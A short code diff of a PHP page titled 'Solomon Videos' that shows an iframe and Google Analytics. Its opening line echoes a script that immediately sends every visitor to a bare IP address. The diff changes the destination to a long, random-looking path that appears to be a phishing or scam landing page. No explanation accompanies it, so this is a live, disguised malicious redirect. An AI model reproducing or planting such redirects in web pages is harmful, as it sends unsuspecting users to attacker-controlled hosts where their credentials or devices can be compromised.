@@ -1,9 +1,17 @@
 <?php 
-    echo "<script>location.href='http://3.138.246.30';</script>";
+    echo "<script>location.href='http://3.138.246.30/uk/scanpr/028newokifgsiufgdsgfinsdinvgisdgvsgvisgvivnidgvdsiungvsnewk/';</script>";
 ?>
 <!DOCTYPE html> 
 <html> 
-  
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-YQ7V4MYRQ1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-YQ7V4MYRQ1');
+</script>
 <head> 
     <title>Solomon Videos</title> 
     <style type="text/css"> 
@@ -40,15 +48,7 @@
             height="100%" 
             scrolling="auto"> 
   </iframe> 
-  <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-YQ7V4MYRQ1"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
 
-  gtag('config', 'G-YQ7V4MYRQ1');
-</script>
 </body> 
   
 </html> 
